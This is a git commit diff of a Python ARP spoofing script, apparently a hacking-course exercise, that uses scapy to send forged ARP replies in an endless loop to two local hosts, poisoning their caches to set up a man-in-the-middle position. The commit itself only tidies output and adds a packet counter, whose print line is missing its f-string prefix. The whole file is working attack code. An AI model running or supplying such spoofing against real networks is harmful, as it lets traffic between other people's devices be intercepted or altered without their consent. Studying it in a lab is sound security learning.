ed6f12959e7d87d578263d21197866e7439c0cbc
Sumeet Singh <sumeet605@gmail.com>
2024-07-15 16:52:50 -0400

    s

--- 3_ARPSpoofer/arpSpoofer.py
+++ 3_ARPSpoofer/arpSpoofer.py
@@ -8,17 +8,19 @@ def getMac(ip):
     arpRequestBroadcast = broadcast/arpRequest
     
     answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
-
-    print(answered)
     
     return answered[0][1].hwsrc
 
 def spoof(targetIP, spoofIP):
     targetMac = getMac(targetIP)
     packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
     
+packetsCount = 0    
+
 while True:
     spoof("192.168.42.254", "192.168.42.1")
     spoof("192.168.42.1", "192.168.42.254")
+    print("[+] Packets sent {packetsCount}")
+    packetsCount += 2
     time.sleep(1)
